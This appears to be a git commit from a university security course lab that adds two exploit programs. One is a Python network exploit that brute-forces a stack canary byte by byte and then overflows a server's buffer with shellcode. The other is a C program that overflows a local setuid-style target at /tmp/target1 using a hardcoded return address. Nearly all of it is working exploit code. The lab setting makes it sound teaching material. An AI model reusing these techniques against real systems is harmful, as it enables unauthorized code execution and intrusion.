2b7a55218515ed8656ddb8758cce3ba800ac385f
Ubuntu <user@vm-cs155.localdomain>
2015-04-21 02:42:41 +0000

    modified extra credit

---
+++ sploits/extra-credit.py
@@ -0,0 +1,71 @@
+#!/usr/bin/python2
+import sys
+import socket
+import traceback
+import struct
+
+####
+
+## This function takes your exploit code, adds a carriage-return and newline
+## and sends it to the server. The server will always respond, but if the
+## exploit crashed the server it will close the connection. Therefore, we try
+## to write another query to the server, recv on the socket and see if we get
+## an exception
+##
+## True means the exploit made the server close the connection (i.e. it crashed)
+## False means the socket is still operational.
+def try_exploit(exploit, host, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((host, port))
+    sock.send("%s\n" % exploit)
+    b = 0
+    while b < (len(exploit) + 1):
+        mylen = len(sock.recv(4098))
+        b += mylen
+        if mylen == 0:
+            return True
+    sock.send("\n")
+    try:
+        return len(sock.recv(5)) == 0
+    except:
+        return True
+
+def exploit(host, port, shellcode):
+    # Build your exploit here
+    # One useful function might be
+    #   struct.pack("<I", x)
+    # which returns the 4-byte binary encoding of the 32-bit integer x
+
+    exploit = '\x90'* (2048 - len(shellcode)) + shellcode
+
+    for byte in range(0,4):
+	for c in range(0,256):
+		if c == 10:
+			continue
+		if try_exploit(exploit + chr(c), host, port):
+			continue
+		else:
+			exploit += chr(c)
+			break
+   
+    exploit += "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
+    exploit += "\xdc\xee\xff\xbf"
+    try_exploit(exploit, host, port)
+    print "Exploit Done."
+
+
+####
+
+if len(sys.argv) != 3:
+    print("Usage: " + sys.argv[0] + " host port")
+    exit()
+
+try:
+    shellfile = open("shellcode.bin", "r")
+    shellcode = shellfile.read()
+    exploit(sys.argv[1], int(sys.argv[2]), shellcode)
+
+except:
+    print("Exception:")
+    print(traceback.format_exc())
+
---
+++ sploits/sploit1.c
@@ -0,0 +1,26 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include "shellcode.h"
+
+#define TARGET "/tmp/target1"
+
+int main(void)
+{
+  char *args[3];
+  char *env[1];
+
+  char exploit[265];
+  memset(exploit, 0xff, sizeof exploit);
+  exploit[264] = 0;
+  memcpy(exploit, shellcode, sizeof shellcode-1);
+  int *ret = (int *) (exploit + 260);
+  *ret = 0xbffffc50;
+  args[0] = TARGET; args[1] = exploit; args[2] = NULL;
+  env[0] = NULL;
+
+  if (0 > execve(TARGET, args, env))
+    fprintf(stderr, "execve failed.\n");
+  return 0;
+}
